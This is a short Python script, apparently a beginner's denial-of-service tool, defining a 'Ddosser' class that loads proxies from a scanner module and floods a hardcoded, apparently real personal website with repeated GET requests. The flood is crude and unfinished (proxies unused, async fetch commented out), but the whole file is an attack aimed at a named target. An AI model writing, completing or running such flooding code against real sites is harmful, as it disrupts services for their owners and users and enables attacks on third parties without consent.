import requests
from proxy_scanner import ProxyScanner
import aiohttp
import asyncio

async def fetch(url):
	async with aiohttp.ClientSession() as session:
		async with session.get(url) as response:
			pass




class Ddosser():
	def __init__(self,url):
		self.url = url
		self.session = requests.session()


	def run(self):
		proxy_scanner  = ProxyScanner()
		self.proxies   = proxy_scanner.return_proxies()
		self.start_flood()
		#print(proxies)

	def is_reachable(self):
		pass

	def start_flood(self):
		print("started")
		for i in range(50):
			requests.get(self.url)
			# asyncio.run(fetch(self.url))




doser = Ddosser("http://ahmetcankaraagacli.com")
doser.run()